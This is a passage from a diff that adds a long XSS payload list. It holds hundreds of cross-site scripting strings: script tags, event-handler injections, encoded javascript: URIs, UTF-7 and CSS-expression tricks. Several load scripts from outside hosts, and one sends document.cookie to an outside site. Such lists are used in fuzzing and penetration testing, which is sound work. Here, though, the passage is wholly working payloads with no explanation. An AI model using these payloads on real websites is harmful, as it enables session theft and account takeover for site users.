ab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
+<script SRC="http://www.securitycompass.com/xss.jpg"></script>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<img src =q onerror=prompt(8)>
+alert(document['cookie'])
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<BASE HREF="javascript:javascript:alert(1);//">
+"><img src=x onerror=javascript:alert('A')>
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
+<svg contentScriptType=text/vbs><script>MsgBox+1
+ <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<img src=&{document.vulnerable=true;};>
+<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+<IMG SRC=javascript:alert('XSS')>
+<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
+#'%26%26'javascript:alert%25281%2529//
+"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
+<IMG DYNSRC="javascript:javascript:alert(1)">
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<BODY ONLOAD=javascript:alert(1)>
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<svg><script ?>alert(1)
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+<form><isindex formaction="javascript&colon;confirm(1)"
+<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
+<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
+<img src=`xx:xx`onerror=alert(1)>
+"><a>a</a><img src=x onerror=alert(document.cookie)>{{9-9}}';alert(0);://
+&#X03c
+<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+&#x00003c
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<IMG LOWSRC="javascript:alert('XSS')">
+<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
+\\'); alert(\'xss\');var x=\'
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
+<BGSOUND SRC="javascript:javascript:alert(1);">
+\";;alert(';XSS';);//
+eval(a+b+c+d);
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
+<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<style>*[{}@import'%(css)s?]</style>X
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<img src=foo.png onerror=alert(/xssed/) />
+"`'><script>\x0Djavascript:alert(1)</script>
+<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+<script>alert("XSS");</script>&search=1
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<script>%(payload)s</script>
+<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+&lt;!--&#91;if gte IE 4&#93;&gt;
+<BODY ONLOAD=alert("XSS")>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<svg><script onlypossibleinopera:-)> alert(1)
+&#0060
+<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>"></embed>
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+'`"><\x00script>javascript:alert(1)</script>
+<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>document.vulnerable=true;</script>
+<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<;DIV STYLE=";width: expression(alert(';XSS';));";>;
+<img src=&{document.vulnerable=true;};>
+<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<event-source src="%(event)s" onload="javascript:alert(1)">
+<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
+='><script>alert("xss")</script>
+'';!--\"&lt;XSS&gt;=&{()}
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
+<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+<div style=content:url(%(svg)s)></div>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<script src="data:text/javascript,alert(1)"></script>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<isindex+type=image+src=1+onerror=alert(1)>
+ignition/scripts/--><svg%20onload=alert%28document.domain%29>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<table background="javascript:javascript:alert(1)">
+<iframe src-doc="<svg onload=alert (1337)&nvgt;"></iframe>
+<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
+"`'><script>-javascript:alert(1)</script>
+<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
+&<script>document.vulnerable=true;</script>
+&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
+<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
+<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<img/src=`` onerror=this.onerror=confirm(1) 
+<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
+&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
+<w contenteditable id=x onfocus=alert()>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;/br style=a:expression(alert())&gt;
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<img src=x onerror=\x32"javascript:alert(1)">
+<IMG LOWSRC="javascript:alert('XSS')">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<STYLE>li+{list-style-image:url("javascript:alert(1)");}</STYLE><UL><LI>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;	
+<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
+'alert(1)'.replace(/.+/,eval)
+&#60
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+<svg><script ?>alert(1)
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
+&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
+<style TYPE="text/javascript">document.vulnerable=true;</style>
+<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
+<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
+<IMG SRC="javascript:alert('XSS')"
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<? foo="><script>alert(1)</script>">
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script src="data:text/javascript,alert(1)"></script>
+<LAYER SRC="%(scriptlet)s"></LAYER>
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<script itworksinallbrowsers>/*<script* */alert(1)</script
+<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
+<STYLE>@import'%(css)s';</STYLE>
+"`'><script>\x21javascript:alert(1)</script>
+<body oninput=javascript:alert(1)><input autofocus>
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<IFRAME SRC="javascript:alert(document.cookie);"></IFRAME>
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>javascript:alert(1)</script\x0B
+<![><img src="]><img src=x onerror=javascript:alert(1)//">
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+&#X00003C;
+<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
+<input onblur=write(XSS) autofocus><input autofocus>
+"`'><script>\xE2\x80\x80javascript:alert(1)</script>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<img src\x00=x onerror="javascript:alert(1)">
+&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
+</XSS STYLE=xss:expression(alert('XSS'))>
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
+<BGSOUND SRC="javascript:alert('XSS');">
+<img src="Mario Heiderich says that svg SHOULD not be executed trough image tags" onerror="javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');"></img>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+'>><marquee><h1>XSS</h1></marquee>
+<ScRiPt>alert(1)</sCriPt>
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<img src\x12=x onerror="javascript:alert(1)">
+</ foo="><script>alert(1)</script>">
+<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
+<<script>document.vulnerable=true;</script>
+<% foo><x foo="%><script>alert(123)</script>">
+&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+<img\x11src=x onerror="javascript:alert(1)">
+&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
+&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
+exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+<img src=x onerror=\x12"javascript:alert(1)">
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
+http://www.<script>alert(1)</script .com
+d=\"alert('XSS');\\")\";
+<!--<img src="--><img src=x onerror=alert(123)//">
+<img src="blah>" onmouseover="document.vulnerable=true;">
+<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
+<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+<svg><script onlypossibleinopera:-)> alert(1)
+<DIV STYLE="width: expression(alert('XSS'));">
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<IMG SRC= onmouseover="alert('xxs')">
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
+"><img src=x onerror=javascript:alert(("A"))>
+&lt;
+<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
+"><img src=x onerror=javascript:alert(("1"))>
+<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+http://www.<script>alert(1)</script .com
+<img src=x onerror=\x09"javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<IMG SRC="javascript:alert('XSS');">
+&{document.vulnerable=true;};
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
+<;IMG SRC=";mocha:[code]";>;
+<IMG SRC='vbscript:msgbox("XSS")'>
+&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+<IMG SRC="javascript:alert('XSS');">
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+<img \x00src=x onerror="javascript:alert(1)">
+<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
+<script src="#">{alert(1)}</script>;1
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
+<style onreadystatechange=javascript:javascript:alert(1);></style>
+<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
+<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
+<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
+<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
+<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
+<script ~~~>alert(0%0)</script ~~~>
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<div style="x:expression((window.r==1)?'':eval('r=1;
+<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+<video onloadstart=alert()><source></*>
+<var onmouseover="prompt(1)">On Mouse Over</var>
+&#x03C
+"><svg onload=alert(1)>
+&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
